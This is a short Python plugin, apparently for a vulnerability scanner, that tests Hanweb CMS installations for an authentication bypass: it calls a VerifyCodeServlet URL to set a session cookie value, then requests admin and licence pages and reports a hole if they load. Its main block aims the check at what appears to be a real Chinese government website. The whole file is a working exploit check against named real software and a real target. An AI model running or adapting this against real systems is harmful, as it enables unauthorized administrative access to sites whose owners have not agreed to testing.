#!/usr/bin/python
# -*- coding:utf-8 -*-
import urlparse
def assign(service, arg): 
    if service == "hanweb":
        return True, arg
		
def audit(arg):
    paths=['vipchat/','jcms/','jsearch/','jact/','vc/','xxgk/'] 
    payload = 'VerifyCodeServlet?var=cookie_username'
    adminpaths=['setup/opr_licenceinfo.jsp','setup/admin.jsp']
    for path in paths:
    	url=arg+path+payload
    	code, head, res, errcode, _ = curl.curl2(url)
    	if code==200:
    		for adminpath in adminpaths:
    			adminurl=arg+path+adminpath
    			code, head, res, errcode, _ = curl.curl2(adminurl)
    			if code ==200 and  ('Licence' in res or 'admin' in res):
    				security_hole(adminurl)	

if __name__ == '__main__': 
    from dummy import *
    audit(assign('hanweb', 'http://www.zgzhijiang.gov.cn/')[1])